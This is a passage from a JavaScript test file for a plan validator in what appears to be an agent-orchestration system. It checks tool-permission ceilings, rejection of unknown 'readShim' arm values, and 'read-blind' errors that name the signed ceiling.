  assert.deepEqual(validatePlan(blind, { ...OPTS, readShim: true }).reds, cap.reds);
  // …while the diff arm agrees with the OFF baseline, byte for byte
  assert.deepEqual(diff.reds, validatePlan(blind, OPTS).reds);
});

test('an unrecognised arm THROWS out of validatePlan — the caller\'s own argument, not a plan red', () => {
  // The "never throws" contract covers the AGENT's artifact. This is the
  // operator's: coerced by truthiness it would validate A2's plans under A3's
  // admission rule and nothing downstream would ever say so.
  assert.throws(() => validatePlan(clone(PLAN), { ...OPTS, readShim: /** @type {any} */ ('diff ') }), /unknown arm/);
  assert.throws(() => validatePlan(clone(PLAN), { ...OPTS, readShim: /** @type {any} */ ('all') }), /unknown arm/);
});

test('G1 names the SIGNED CEILING when it is the ceiling that lacks the retrieval pair', () => {
  // The step cannot grant what the spec never signed, so the redraft loop can
  // never satisfy this — and the honest stop is a red that says so, not a
  // capped worker sent in blind. The cure is operator territory: re-sign the
  // spec with recall/get, or run with the shim off.
  const job = { ...JOB, tools: ['read', 'write', 'edit'] };
  const plan = clone(PLAN);
  plan.steps[0].tools = ['read', 'write'];
  plan.steps[1].tools = ['write', 'edit'];
  const r = validatePlan(plan, { job, readShim: true });
  assert.equal(r.ok, false);
  assert.equal(r.reds.filter((x) => x.code === 'read-blind').length, 1, `got ${JSON.stringify(r.reds)}`);
  assert.match(r.reds.find((x) => x.code === 'read-blind')?.detail ?? '', /signed ceiling/);
});
